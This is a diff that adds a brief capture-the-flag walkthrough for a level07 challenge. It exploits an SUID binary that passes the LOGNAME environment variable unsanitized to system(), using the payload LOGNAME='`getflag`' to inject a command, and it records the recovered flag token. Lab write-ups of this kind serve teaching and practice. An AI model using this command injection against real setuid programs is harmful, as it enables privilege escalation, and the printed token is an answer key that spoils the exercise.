@@ -1,0 +1,24 @@
+1. List files in the directory:
+   ll
+   # Output shows: level07 binary with SUID permissions (rwsr-sr-x) owned by flag07
+
+2. Analyze the binary using ltrace:
+   ltrace ./level07
+   # Shows the binary gets LOGNAME environment variable
+   # Executes: system("/bin/echo level07 ")
+   # The LOGNAME variable is used unsanitized in system call
+
+3. Check current LOGNAME variable:
+   echo $LOGNAME
+   # Output: level07
+
+4. Exploit by modifying LOGNAME environment variable:
+   export LOGNAME='`getflag`'
+   ./level07
+   # Command substitution executes getflag within the system call
+   # Output: Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+TECHNIQUE: Environment variable injection in system call
+VULNERABILITY: Unsanitized environment variable used in system() call
+PAYLOAD: LOGNAME='`getflag`' - Command substitution via environment variable
+TOKEN: fiumuikeil55xe9cu4dood66h
